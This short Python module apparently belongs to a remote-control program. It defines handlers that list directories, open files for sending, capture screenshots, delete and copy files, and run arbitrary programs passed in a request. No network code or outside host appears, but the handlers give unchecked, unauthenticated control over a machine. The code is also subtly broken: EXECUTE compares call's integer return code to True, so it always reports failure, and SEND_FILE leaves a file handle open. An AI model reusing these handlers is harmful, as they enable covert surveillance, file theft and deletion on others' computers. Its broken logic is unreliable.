import os
from shutil import copy
from subprocess import call
from PIL import ImageGrab


# request_list[0] = command
# request_list[1 ++] = params


def DIR(request_list):
    files_list = os.listdir(request_list[1])
    return files_list


def SEND_FILE(request_list):
    f = open(request_list[1], 'rb')
    return f


def TAKE_SCREENSHOT(request_list):
    im = ImageGrab.grab()
    im.save('screenshot_to_send.png')
    return im


def DELETE(request_list):
    os.remove(request_list[1])
    return f'Successfully removed {request_list[1]}'


def COPY(request_list):
    copy(request_list[1], request_list[2])
    return f'Successfully copied {request_list[1]} to {request_list[2]}'


def EXECUTE(request_list):
    code = call(request_list[1])
    if code is True:
        return 'process successfully ran!'
    else:
        return 'Error: process failed'
